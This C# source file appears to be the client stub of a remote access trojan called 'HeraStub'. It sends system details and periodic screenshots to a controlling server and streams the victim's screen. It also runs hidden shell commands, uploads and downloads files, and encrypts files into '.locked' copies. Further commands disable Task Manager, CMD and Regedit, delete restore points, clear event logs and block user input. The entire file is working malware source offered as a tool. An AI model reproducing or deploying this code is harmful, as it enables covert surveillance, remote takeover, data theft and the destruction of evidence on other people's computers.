using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Management;
using System.Runtime.InteropServices;
using System.Management.Instrumentation;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Security.Cryptography;
using System.ComponentModel;
using Microsoft.Win32;

namespace HeraStub
{
    public static class ClientHelper
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        // Fun Command Import Begin
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        private static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hwnd, int command);
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool State);
        [DllImport("user32.dll")]
        static extern int ShowCursor(bool State);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
        [DllImport("Srclient.dll")]
        private static extern int SRRemoveRestorePoint(int index);
        // Fun Command Import End
        private const int WM_SYSCOMMAND = 0x0112;
        private const uint SC_MONITORPOWER = 0xF170;
        private static bool ScreenRunning = false;
        public static bool Confirmed = false;
        public static String CurrentFileTransfer = "";
        public static int CurrentFileSizeRemaining = 0;
        public static int CurrentFileSize = 0;
        public static int ChunkSize = 0;
        public static int CurrentBytePos = 0;
        public static void RefreshInfo(Socket ServerSocket)
        {
            try
            {
                PerformanceCounter CPU_Details = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                PerformanceCounter RAM_Details = new PerformanceCounter("Memory", "Available MBytes");
                while (true)
                {
                    //RAM Curr
                    String RAM_Current = RAM_Details.NextValue().ToString() + " MB";
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|RAM Curr|" + RAM_Current));
                    //CPU Usage
                    String CPU_Current = CPU_Details.NextValue().ToString() + "%";
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|CPU Usage|" + CPU_Current));
                    //Active Window
                    StringBuilder Buff = new StringBuilder(1024);
                    if (GetWindowText(GetForegroundWindow(), Buff, 1024) > 0)
                    {
                        ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Active Window|" + Buff.ToString()));
                    }
                    try
                    {
                        ServerSocket.Send(GetScreenByte());
                    }
                    catch (Exception ex)
                    {
                       //MessageBox.Show(ex.ToString());
                    }
                    System.Threading.Thread.Sleep(5000);
                }
            }
            catch
            {
                ServerSocket.Disconnect(true);
            }
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, String Password)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            byte[] passwordBytes = Encoding.ASCII.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, String Password)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            byte[] passwordBytes = Encoding.ASCII.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }

        public static byte[] GetScreenByte()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                MemoryStream ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Jpeg);
                byte[] Sendjpg = ms.ToArray();
                return Sendjpg;
            }
        }

        public static void HandleRemoteDesktopScreen(List<String> Packet, Socket ServerSocket)
        {
            if (Packet[1] == "StartDesktop")
            {
                ScreenRunning = true;
            }
            else if (Packet[1] == "StopDesktop")
            {
                ScreenRunning = false;
            }
            while (ScreenRunning)
            {
                List<Byte> Buffer = new List<Byte>();
                foreach (Byte b in Encoding.ASCII.GetBytes("&".ToCharArray()))
                {
                    Buffer.Add(b);
                }
                foreach (Byte b in GetScreenByte())
                {
                    Buffer.Add(b);
                }
                ServerSocket.Send(Buffer.ToArray());
                Thread.Sleep(150);
            }
        }

        public static void GetInfo(Socket ServerSocket)
        {
            try
            {
                //PC Name
                ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|PC Name|" + Environment.MachineName.ToString()));
                //Username
                ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Username|" + Environment.UserName.ToString()));
                //CPU
                ManagementObjectSearcher mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mo in mos.Get())
                {
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|CPU|" + mo["Name"].ToString()));
                }
                //GPU
                mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mo in mos.Get())
                {
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|GPU|" + mo["Name"].ToString()));
                }
                //RAM Max
                mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory");
                foreach (ManagementObject mo in mos.Get())
                {
                    long Capacity = Convert.ToInt64(mo["Capacity"].ToString());
                    String CapacityGB = (Capacity / (1024 * 1024 * 1024)).ToString();
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|RAM Max|" + CapacityGB + " GB"));
                }
                //RAM Current
                //Motherboard
                mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Baseboard");
                foreach (ManagementObject mo in mos.Get())
                {
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Motherboard|" + mo["Product"].ToString() + " @ " + mo["Manufacturer"].ToString()));
                }
                //CPU Usage
                //Active Window
                Thread DynamicInfo = new Thread((new ThreadStart(() => RefreshInfo(ServerSocket))));
                DynamicInfo.Start();
                //OS
                //System Arch
                mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
                foreach (ManagementObject mo in mos.Get())
                {
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|OS|" + mo["Caption"].ToString()));
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|System Arch|" + mo["OSArchitecture"].ToString()));
                }
                //Camera
                try
                {
                    mos = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity");
                    String Camera = "";
                    foreach (ManagementObject mo in mos.Get())
                    {
                        String SystemDevices = mo["Name"].ToString();
                        if (SystemDevices.ToLower().Contains("webcam"))
                        {
                            //MessageBox.Show(mo["Name"].ToString());
                            Camera = mo["Name"].ToString();
                        }
                    }
                    if (Camera != "")
                    {
                        ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Camera|" + Camera));
                    }
                    else
                    {
                        ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Camera|None"));
                    }
                }
                catch
                {
                    ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|Camera|None"));
                }
                //Anti Virus
                using (var antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    var getSearchResult = antiVirusSearch.Get();
                    if (getSearchResult.Count > 0)
                    {
                        foreach (var searchResult in getSearchResult)
                        {
                            ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|AntiVirus|" + searchResult["displayName"].ToString()));
                        }
                    }
                    else
                    {
                        ServerSocket.Send(Encoding.ASCII.GetBytes("Detail|AntiVirus|None"));
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
            }
        }

        public static bool HandleSystemCommand(String Command)
        {
            if (Command == "Restart")
            {
                return true;
            }
            else if (Command == "Uninstall")
            {
                //Remnent Uninstall
                return false;
            }
            else if (Command == "Close")
            {
                Environment.Exit(0);
                return false;
            }
            else
            {
                return false;
            }
        }

        public static void HandleShellExecute(String Command, Socket ReturnAddress)
        {
            //account for change directory
            String CurrDir = Directory.GetCurrentDirectory();
            //MessageBox.Show(Command);
            if (Command.Split(' ')[0] == "cd")
            {
                try
                {
                    if (Command.Split(' ')[1] == "..")
                    {
                        Directory.SetCurrentDirectory(Directory.GetParent(Directory.GetCurrentDirectory()).FullName);
                    }
                    else if (Command.Split(' ')[1] == "*")
                    {

                    }
                    else
                    {
                        Directory.SetCurrentDirectory(Command.Split(' ')[1]);
                    }
                    CurrDir = Directory.GetCurrentDirectory();
                    ReturnAddress.Send(Encoding.ASCII.GetBytes("ShellResponse|" + Environment.NewLine + Environment.NewLine + CurrDir + "> "));
                }
                catch
                {
                    String FailMessage = "The system cannot find the path specified.";
                    ReturnAddress.Send(Encoding.ASCII.GetBytes("ShellResponse|" + FailMessage + Environment.NewLine + Environment.NewLine + CurrDir + "> "));
                }
            }
            else
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.CreateNoWindow = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.FileName = "cmd";
                    startInfo.Arguments = " /c " + Command;
                    Process RunningCommand = new Process();
                    RunningCommand.StartInfo = startInfo;
                    String Result = "";
                    RunningCommand.Start();
                    //MessageBox.Show("Process Started");
                    RunningCommand.WaitForExit(10000);
                    //MessageBox.Show("Process Exited!");
                    Result = RunningCommand.StandardOutput.ReadToEnd();
                    //MessageBox.Show(Result, "Process ended!");
                    ReturnAddress.Send(Encoding.ASCII.GetBytes("ShellResponse|" + Result + Environment.NewLine + Environment.NewLine + CurrDir + "> "));
                }
                catch (Exception ex)
                {
                    String Error = ex.ToString();
                    ReturnAddress.Send(Encoding.ASCII.GetBytes("ShellResponse|" + Error + Environment.NewLine + Environment.NewLine + CurrDir + "> "));
                }
            }
        }

        public static void HandleFunCommand(List<String> Packet)
        {
            IntPtr Trayhwnd = FindWindow("Shell_traywnd", "");
            IntPtr TrayIconshwnd = FindWindowEx(Trayhwnd, IntPtr.Zero, "TrayNotifyWnd", null);
            IntPtr Clockhwnd = FindWindowEx(TrayIconshwnd, IntPtr.Zero, "TrayClockWClass", null);
            IntPtr AppIconshwnd = FindWindowEx(Trayhwnd, IntPtr.Zero, "ReBarWindow32", null);
            IntPtr Desktophwnd = FindWindow("Progman", "Program Manager");
            switch (Packet[1])
            {
                case "Taskmgr":
                    RegistryKey TaskKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    switch (Packet[2])
                    {
                        case "Disable":
                            TaskKey.SetValue("DisableTaskMgr", 1);
                            break;
                        case "Enable":
                            TaskKey.SetValue("DisableTaskMgr", 0);
                            break;
                    }
                    TaskKey.Close();
                    break;
                case "CMD":
                    RegistryKey CMDKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    switch (Packet[2])
                    {
                        case "Disable":
                            CMDKey.SetValue("DisableCMD", 2);
                            break;
                        case "Enable":
                            CMDKey.SetValue("DisableCMD", 0);
                            break;
                    }
                    CMDKey.Close();
                    break;
                case "Regedit":
                    RegistryKey RegeditKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    switch (Packet[2])
                    {
                        case "Disable":
                            RegeditKey.SetValue("DisableRegistryTools", 1);
                            break;
                        case "Enable":
                            RegeditKey.SetValue("DisableRegistryTools", 0);
                            break;
                    }
                    RegeditKey.Close();
                    break;
                case "DeleteRestorePoints":
                    System.Management.ManagementClass objClass = new System.Management.ManagementClass("\\\\.\\root\\default", "systemrestore", new System.Management.ObjectGetOptions());
                    System.Management.ManagementObjectCollection objCol = objClass.GetInstances();
                    List<int> RestorePoints = new List<int>();
                    foreach (ManagementObject objItem in objCol)
                    {
                        RestorePoints.Add(Convert.ToInt32((uint)objItem["sequencenumber"]));
                    }
                    foreach (int RestoreID in RestorePoints)
                    {
                        try
                        {
                            SRRemoveRestorePoint(RestoreID);
                        }
                        catch { }
                    }
                    break;
                case "DeleteEventLogs":
                    foreach (EventLog CurrentLog in EventLog.GetEventLogs())
                    {
                        try
                        {
                            CurrentLog.Clear();
                            CurrentLog.Dispose();
                        }
                        catch { }
                    }
                    break;
                case "CloseCDTray":
                    mciSendStringA("set CDAudio door open", "", 127, 0);
                    break;
                case "OpenCDTray":
                    mciSendStringA("set CDAudio door closed", "", 127, 0);
                    break;
                case "HideTrayIcons":
                    ShowWindow(TrayIconshwnd, 0);
                    break;
                case "ShowTrayIcons":
                    ShowWindow(TrayIconshwnd, 1);
                    break;
                case "HideCursor":
                    ShowCursor(false); //Might need to hook explorer.exe
                    break;
                case "ShowCursor":
                    ShowCursor(true);  //Might need to hook explorer.exe
                    break;
                case "HideTaskIcons":
                    ShowWindow(AppIconshwnd, 0);
                    break;
                case "ShowTaskIcons":
                    ShowWindow(AppIconshwnd, 1);
                    break;
                case "DisableUserInput":
                    BlockInput(true);
                    break;
                case "EnableUserInput":
                    BlockInput(false);
                    break;
                case "HideClock":
                    ShowWindow(Clockhwnd, 0);
                    break;
                case "ShowClock":
                    ShowWindow(Clockhwnd, 1);
                    break;
                case "MonitorOff":
                    SendMessage(GetConsoleWindow(), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)(-1));
                    break;
                case "MonitorOn":
                    SendMessage(GetConsoleWindow(), WM_SYSCOMMAND, (IntPtr)SC_MONITORPOWER, (IntPtr)(2));
                    break;
                case "HideTaskbar":
                    ShowWindow(Trayhwnd, 0);
                    break;
                case "ShowTaskbar":
                    ShowWindow(Trayhwnd, 1);
                    break;
                case "HideDesktopIcons":
                    ShowWindow(Desktophwnd, 0);
                    break;
                case "ShowDesktopIcons":
                    ShowWindow(Desktophwnd, 5);
                    break;
                default:
                    String FullPacket = "";
                    foreach (String CurrString in Packet)
                    {
                        FullPacket = FullPacket + CurrString + " + ";
                    }
                    //MessageBox.Show(FullPacket);
                    break;
            }
        }

        public static void HandleFileCommand(List<String> Packet, Socket ReturnAddress)
        {
            //MessageBox.Show(Packet[1], "Processing...");
            switch (Packet[1])
            {
                case "GetDirectory":
                    if (Packet[2] == "" || Packet[2] == null)
                    {
                        String ReturnDirectory = Directory.GetCurrentDirectory().ToString();
                        String FileContainer = "";
                        String DirectoryContainer = "";
                        foreach (String DirName in Directory.GetDirectories(ReturnDirectory))
                        {
                            DirectoryContainer = DirectoryContainer + DirName + "*";
                        }
                        foreach (String FileName in Directory.GetFiles(ReturnDirectory))
                        {
                            FileContainer = FileContainer + FileName + "*";
                        }
                        ReturnAddress.Send(Encoding.ASCII.GetBytes("FileDetail|ReturnDirectory|" + ReturnDirectory + "|" + DirectoryContainer + "|" + FileContainer));
                    }
                    else
                    {
                        try
                        {
                            String ReturnDirectory = Packet[2];
                            String FileContainer = "";
                            String DirectoryContainer = "";
                            foreach (String DirName in Directory.GetDirectories(ReturnDirectory))
                            {
                                DirectoryContainer = DirectoryContainer + DirName + "*";
                            }
                            foreach (String FileName in Directory.GetFiles(ReturnDirectory))
                            {
                                FileContainer = FileContainer + FileName + "*";
                            }
                            ReturnAddress.Send(Encoding.ASCII.GetBytes("FileDetail|ReturnDirectory|" + ReturnDirectory + "|" + DirectoryContainer + "|" + FileContainer));
                        }
                        catch { }
                    }
                    break;
                case "Action":
                    switch (Packet[2])
                    {
                        case "Delete":
                            File.Delete(Packet[3]);
                            break;
                        case "Execute":
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = Packet[3];
                            Process.Start(startInfo);
                            break;
                        case "Encrypt":
                            String Password = Packet[3];
                            String FileToEnc = Packet[4];
                            File.WriteAllBytes(FileToEnc + ".locked", AES_Encrypt(File.ReadAllBytes(FileToEnc), Password));
                            File.Delete(FileToEnc);
                            break;
                        case "Decrypt":
                            String PasswordDec = Packet[3];
                            String FileToDec = Packet[4];
                            String FileResult = FileToDec.Replace(".locked", "");
                            File.WriteAllBytes(FileResult, AES_Decrypt(File.ReadAllBytes(FileToDec), PasswordDec));
                            File.Delete(FileToDec);
                            break;
                        case "CopyTo":
                            try
                            {
                                String DirectoryCP = Packet[3];
                                String FileCopyFrom = Packet[4];
                                char[] DirectoryMod = DirectoryCP.ToCharArray();
                                char[] FileMod = FileCopyFrom.ToCharArray();
                                List<String> FileCopyParts = FileCopyFrom.Split('\\').ToList();
                                if (DirectoryMod[DirectoryMod.Count() - 1] == '\\')
                                {
                                    if (FileMod[FileMod.Count() - 1] == '\\')
                                    {
                                        String ResultingFile = DirectoryCP + FileCopyParts[FileCopyParts.Count - 2];
                                        File.Copy(FileCopyFrom, ResultingFile);
                                    }
                                    else
                                    {
                                        String ResultingFile = DirectoryCP + FileCopyParts[FileCopyParts.Count - 1];
                                        File.Copy(FileCopyFrom, ResultingFile);
                                    }
                                }
                                else
                                {
                                    if (FileMod[FileMod.Count() - 1] == '\\')
                                    {
                                        String ResultingFile = DirectoryCP + "\\" + FileCopyParts[FileCopyParts.Count - 2];
                                        File.Copy(FileCopyFrom, ResultingFile);
                                    }
                                    else
                                    {
                                        String ResultingFile = DirectoryCP + "\\" + FileCopyParts[FileCopyParts.Count - 1];
                                        File.Copy(FileCopyFrom, ResultingFile);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                //MessageBox.Show(ex.ToString(), "Copy File Error!");
                            }
                            break;
                        case "MoveTo":
                            try
                            {
                                String DirectoryMov = Packet[3];
                                String FileMoveFrom = Packet[4];
                                char[] DirectoryModv = DirectoryMov.ToCharArray();
                                char[] FileModv = FileMoveFrom.ToCharArray();
                                List<String> FileMoveParts = FileMoveFrom.Split('\\').ToList();
                                if (DirectoryModv[DirectoryModv.Count() - 1] == '\\')
                                {
                                    if (FileModv[FileModv.Count() - 1] == '\\')
                                    {
                                        String ResultingFile = DirectoryMov + FileMoveParts[FileMoveParts.Count - 2];
                                        File.Copy(FileMoveFrom, ResultingFile);
                                        File.Delete(FileMoveFrom);
                                    }
                                    else
                                    {
                                        String ResultingFile = DirectoryMov + FileMoveParts[FileMoveParts.Count - 1];
                                        File.Copy(FileMoveFrom, ResultingFile);
                                        File.Delete(FileMoveFrom);
                                    }
                                }
                                else
                                {
                                    if (FileModv[FileModv.Count() - 1] == '\\')
                                    {
                                        String ResultingFile = DirectoryMov + "\\" + FileMoveParts[FileMoveParts.Count - 2];
                                        File.Copy(FileMoveFrom, ResultingFile);
                                        File.Delete(FileMoveFrom);
                                    }
                                    else
                                    {
                                        String ResultingFile = DirectoryMov + "\\" + FileMoveParts[FileMoveParts.Count() - 1];
                                        File.Copy(FileMoveFrom, ResultingFile);
                                        File.Delete(FileMoveFrom);
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                //MessageBox.Show(ex.ToString(), "Move File Error!");
                            }
                            break;
                    }
                    break;
            }
        }

        public static void HandleStartFileUpload(List<String> Packet, Socket ReturnAddress)
        {
            CurrentFileTransfer = Packet[1];
            CurrentFileSizeRemaining = Convert.ToInt32(Packet[2]);
            CurrentFileSize = Convert.ToInt32(Packet[2]);
            double RequestedChunkSize = CurrentFileSize / 50;
            ChunkSize = (int)RequestedChunkSize + 1;
            if (ChunkSize > 1000000)
            {
                ChunkSize = 750000;
            }
        }

        public static void HandleFileChunk(byte[] Chunk, Socket ReturnAddress)
        {
            try
            {
                using (FileStream fs = new FileStream(CurrentFileTransfer, FileMode.Append, FileAccess.Write))
                {
                    FileInfo fi = new FileInfo(CurrentFileTransfer);
                    fs.Write(Chunk, 1, ChunkSize);
                    fs.Close();
                    ReturnAddress.Send(Encoding.ASCII.GetBytes("FileDetail|ConfirmChunkRecv"));
                    CurrentFileSizeRemaining = CurrentFileSizeRemaining - ChunkSize;
                }
                //MessageBox.Show(File.Exists(CurrentFileTransfer).ToString(), CurrentFileTransfer);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString(), "Chunk");
            }
        }

        public static void HandleFileEndChunk(byte[] Chunk, Socket ReturnAddress)
        {
            try
            {
                using (FileStream fs = new FileStream(CurrentFileTransfer, FileMode.Append, FileAccess.Write))
                {
                    //MessageBox.Show(Chunk.ToString() + " vs. " + CurrentFileSizeRemaining.ToString());
                    fs.Write(Chunk, 1, CurrentFileSizeRemaining);
                    fs.Close();
                }
                ReturnAddress.Send(Encoding.ASCII.GetBytes("FileDetail|ConfirmChunkRecv"));
                CurrentFileTransfer = "";
                CurrentFileSizeRemaining = 0;
                CurrentFileSize = 0;
                CurrentBytePos = 0;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString(), "Ending Chunk");
                ReturnAddress.Send(Encoding.ASCII.GetBytes("FileDetail|ConfirmChunkRecv"));
                CurrentFileTransfer = "";
                CurrentFileSizeRemaining = 0;
                CurrentFileSize = 0;
                CurrentBytePos = 0;
            }
        }

        public static void HandleEndFileUpload(List<String> Packet, Socket ReturnAddress)
        {
            CurrentFileTransfer = "";
        }



        public static void HandleFileDownload(List<String> Packet, Socket ReturnAddress)
        {
            try
            {
                FileInfo fi = new FileInfo(Packet[1]);
                int FileLength = (int)fi.Length;
                double RequestedChunkSize = FileLength / 50;
                int RealChunkSize = (int)RequestedChunkSize + 1; // this is 1 byte difference so it doesnt really matter
                if (RealChunkSize > 1000000)
                {
                    RealChunkSize = 750000;
                }
                int ReadBytes = 0;
                int BytesRemaining = FileLength; 
                String InitializationPacket = "FileDetail|SetUpload|" + Packet[2] + "|" + FileLength.ToString();
                ReturnAddress.Send(Encoding.ASCII.GetBytes(InitializationPacket));
                using (FileStream fs = new FileStream(Packet[1], FileMode.Open, FileAccess.Read))
                {
                    while (ReadBytes < FileLength)
                    {
                        if (BytesRemaining < RealChunkSize)
                        {
                            byte[] Chunk = new byte[BytesRemaining];
                            fs.Read(Chunk, 0, BytesRemaining);
                            Confirmed = false;
                            List<byte> DataPacket = new List<byte>();
                            DataPacket.Add(Encoding.ASCII.GetBytes("$")[0]);
                            DataPacket.AddRange(Chunk);
                            ReturnAddress.Send(DataPacket.ToArray());
                            while (Confirmed == false)
                            {
                                System.Threading.Thread.Sleep(250);
                            }
                            ReadBytes = ReadBytes + BytesRemaining;
                        }
                        else
                        {
                            byte[] Chunk = new byte[RealChunkSize];
                            fs.Read(Chunk, 0, RealChunkSize);
                            Confirmed = false;
                            List<byte> DataPacket = new List<byte>();
                            DataPacket.Add(Encoding.ASCII.GetBytes("@")[0]);
                            DataPacket.AddRange(Chunk);
                            ReturnAddress.Send(DataPacket.ToArray());
                            while (Confirmed == false)
                            {
                                System.Threading.Thread.Sleep(250);
                            }
                            ReadBytes = ReadBytes + RealChunkSize;
                            BytesRemaining = BytesRemaining - RealChunkSize;
                        }
                    }
                    fs.Close();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString()); 
            }
            String FinalPacket = "FileDetail|EndUpload";
            ReturnAddress.Send(Encoding.ASCII.GetBytes(FinalPacket));
        }

    }
}
